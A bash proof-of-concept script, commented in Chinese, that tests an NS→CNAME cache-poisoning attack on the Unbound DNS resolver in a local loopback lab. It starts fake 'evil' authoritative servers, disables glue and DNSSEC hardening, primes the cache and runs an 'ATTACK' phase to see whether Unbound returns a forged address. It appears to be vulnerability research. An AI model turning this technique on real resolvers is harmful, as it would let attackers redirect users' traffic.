#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════
#  NS→CNAME Cache Poisoning PoC v6 — 缓存预填充 + CNAME glue 追踪
#  
#  核心发现：Unbound 存储 CNAME glue 但不自动追踪。
#  本版测试：预填充 resolve.evil.com A 缓存 → Unbound 是否在
#  处理 ns.victim.com CNAME 时使用缓存的 A 记录作为 NS 地址
# ═══════════════════════════════════════════════════════════════════
set -euo pipefail

export DEBIAN_FRONTEND=noninteractive
apt-get update -qq > /dev/null 2>&1
apt-get install -y -qq dnsutils python3 > /dev/null 2>&1

VDIR="/workspace/output/unbound-cache-poison-test-v6"
mkdir -p "$VDIR"
UNBOUND="/workspace/output/unbound-binary-baseline"

kill_all() {
  pkill -f "python3" 2>/dev/null || true
  pkill -f "unbound.*5353" 2>/dev/null || true
  sleep 1
}
kill_all

echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  NS→CNAME Cache Poisoning PoC v6                            ║"
echo "║  Cache-primed CNAME glue resolution test                    ║"
echo "╚══════════════════════════════════════════════════════════════╝"

ip addr add 127.0.0.2/8 dev lo 2>/dev/null || true
ip addr add 127.0.0.3/8 dev lo 2>/dev/null || true

# ═══ Reuse v5's auth servers ═══
cp "/workspace/output/unbound-cache-poison-test-v5/auth_main.py" "$VDIR/auth_main.py" 2>/dev/null || true
cp "/workspace/output/unbound-cache-poison-test-v5/auth_evil.py" "$VDIR/auth_evil.py" 2>/dev/null || true
cp "/workspace/output/unbound-cache-poison-test-v5/fake_ns.py" "$VDIR/fake_ns.py" 2>/dev/null || true

# If files don't exist from v5, create them
if [ ! -f "$VDIR/auth_main.py" ]; then
  echo "v5 files not found, creating fresh..."
  exit 1
fi

> "$VDIR/main_queries.jsonl" 2>/dev/null || true
> "$VDIR/evil_queries.jsonl" 2>/dev/null || true
> "$VDIR/fake_queries.jsonl" 2>/dev/null || true

python3 "$VDIR/auth_main.py" > "$VDIR/main.log" 2>&1 &
MAIN_PID=$!
sleep 0.5

python3 "$VDIR/auth_evil.py" > "$VDIR/evil.log" 2>&1 &
EVIL_PID=$!
sleep 0.5

python3 "$VDIR/fake_ns.py" > "$VDIR/fake.log" 2>&1 &
FAKE_PID=$!
sleep 0.5

echo "  Servers started"

# ═══ Unbound ═══
cat > "$VDIR/hint" << 'EOF'
. IN NS ns1.
ns1. IN A 127.0.0.2
EOF

cat > "$VDIR/ub.conf" << 'CONF'
server:
    directory: "/workspace/output/unbound-cache-poison-test-v6"
    pidfile: "/workspace/output/unbound-cache-poison-test-v6/unbound.pid"
    port: 5353
    interface: 127.0.0.1@5353
    do-ip6: no
    access-control: 127.0.0.0/8 allow
    username: ""
    chroot: ""
    do-daemonize: no
    use-syslog: no
    logfile: "/workspace/output/unbound-cache-poison-test-v6/unbound.log"
    verbosity: 4
    log-queries: yes
    log-replies: yes
    do-not-query-localhost: no
    root-hints: "/workspace/output/unbound-cache-poison-test-v6/hint"
    domain-insecure: "victim.com"
    domain-insecure: "evil.com"
    domain-insecure: "safe.com"
    domain-insecure: "com"
    domain-insecure: "."
    harden-glue: no
    harden-dnssec-stripped: no
    val-permissive-mode: yes
    prefetch: no

remote-control:
    control-enable: yes
    control-interface: 127.0.0.1
    control-port: 8953
    server-key-file: ""
    server-cert-file: ""
    control-key-file: ""
    control-cert-file: ""
CONF

# Generate self-signed certs for remote control
cd "$VDIR"
unbound-control-setup -d "$VDIR" 2>/dev/null || true
cd /workspace

"$UNBOUND" -c "$VDIR/ub.conf" -d > "$VDIR/unbound_stdout.log" 2>&1 &
UB_PID=$!
sleep 3

if kill -0 "$UB_PID" 2>/dev/null; then
  echo "  Unbound started (PID=$UB_PID)"
else
  echo "  Unbound FAILED"
  cat "$VDIR/unbound.log" | head -20
  kill_all; exit 1
fi

# ═══ TEST ═══
echo ""
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  Phase 1: Cache priming — resolve resolve.evil.com first    ║"
echo "╚══════════════════════════════════════════════════════════════╝"

echo ""
echo "  Step 1a: Resolve evil.com NS (primes evil.com delegation)"
dig @127.0.0.1 -p 5353 evil.com NS +time=5 +noall +answer 2>&1

echo ""
echo "  Step 1b: Resolve resolve.evil.com A → should be 127.0.0.1"
dig @127.0.0.1 -p 5353 resolve.evil.com A +time=5 +noall +answer 2>&1

echo ""
echo "  Step 1c: Verify cache — dump_cache for resolve.evil.com"
# Can't use unbound-control without proper certs, use dig +dnssec to verify
echo "  (verifying via dig repeat)"
dig @127.0.0.1 -p 5353 resolve.evil.com A +time=5 +noall +answer 2>&1

echo ""
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  Phase 2: Resolve ns.victim.com (CNAME → cached resolve)    ║"
echo "╚══════════════════════════════════════════════════════════════╝"

> "$VDIR/fake_queries.jsonl" 2>/dev/null || true

echo ""
echo "  Step 2a: Resolve ns.victim.com A"
dig @127.0.0.1 -p 5353 ns.victim.com A +time=10 2>&1 | grep -E "status|flags|victim|CNAME|resolve|ANSWER" | head -10

sleep 1
FAKE_N=$(wc -l < "$VDIR/fake_queries.jsonl" 2>/dev/null || echo 0)
echo "  Fake NS queries so far: $FAKE_N"

echo ""
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  Phase 3: ATTACK — www.victim.com                           ║"
echo "╚══════════════════════════════════════════════════════════════╝"

> "$VDIR/fake_queries.jsonl" 2>/dev/null || true

echo ""
echo "  Querying www.victim.com A..."
dig @127.0.0.1 -p 5353 www.victim.com A +time=15 +tries=1 2>&1

sleep 1
FAKE_N=$(wc -l < "$VDIR/fake_queries.jsonl" 2>/dev/null || echo 0)
echo ""
echo "  Fake NS queries: $FAKE_N"
if [ "$FAKE_N" -gt 0 ] 2>/dev/null; then
  cat "$VDIR/fake_queries.jsonl" 2>/dev/null | python3 -c "
import sys, json
for line in sys.stdin:
    if line.strip():
        q = json.loads(line)
        print(f\"    {q['qname']:<30} {q['qtype']:<8}  ← UNAUTHORIZED!\")" 2>/dev/null
fi

# ═══ Server logs ═══
echo ""
echo "═══ Server logs ═══"

echo ""
echo "  ─── Main auth (127.0.0.2) queries ───"
cat "$VDIR/main_queries.jsonl" 2>/dev/null | python3 -c "
import sys, json
qs = [json.loads(l) for l in sys.stdin if l.strip()]
print(f'  Total: {len(qs)}')
for q in qs:
    print(f\"    {q['qname']:<30} {q['qtype']:<8} → {q['resp']}\")" 2>/dev/null || echo "  (none)"

echo ""
echo "  ─── Evil auth (127.0.0.3) queries ───"
cat "$VDIR/evil_queries.jsonl" 2>/dev/null | python3 -c "
import sys, json
qs = [json.loads(l) for l in sys.stdin if l.strip()]
print(f'  Total: {len(qs)}')
for q in qs:
    print(f\"    {q['qname']:<30} {q['qtype']:<8}\")" 2>/dev/null || echo "  (none)"

echo ""
echo "  ─── Unbound log (CNAME/victim/evil resolution) ───"
grep -iE "cname|victim|evil|resolve|ns\.victim|target|query.restart|chase|fill_target" "$VDIR/unbound.log" 2>/dev/null | head -60 || echo "  (none)"

echo ""
echo "  ─── Unbound log (errors) ───"
grep -iE "servfail|fail|error|exceed|out of.*target" "$VDIR/unbound.log" 2>/dev/null | head -10 || echo "  (none)"

# ═══ Analysis ═══
echo ""
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  Analysis                                                   ║"
echo "╚══════════════════════════════════════════════════════════════╝"

echo ""
echo "  Unbound 的行为分析:"
echo "  1. 如果 Fake NS (127.0.0.1:53) 收到查询 → Unbound 用了 CNAME 解析结果作为 NS 地址"
echo "  2. 如果 Unbound 返回 6.6.6.6 → 缓存投毒证明"
echo "  3. 如果 Unbound 返回 SERVFAIL → CNAME glue 未被自动追踪"
echo ""
echo "  Fake NS queries: $FAKE_N"

kill_all
kill "$MAIN_PID" "$EVIL_PID" "$FAKE_PID" 2>/dev/null || true
echo ""
echo "=== Test Complete ==="
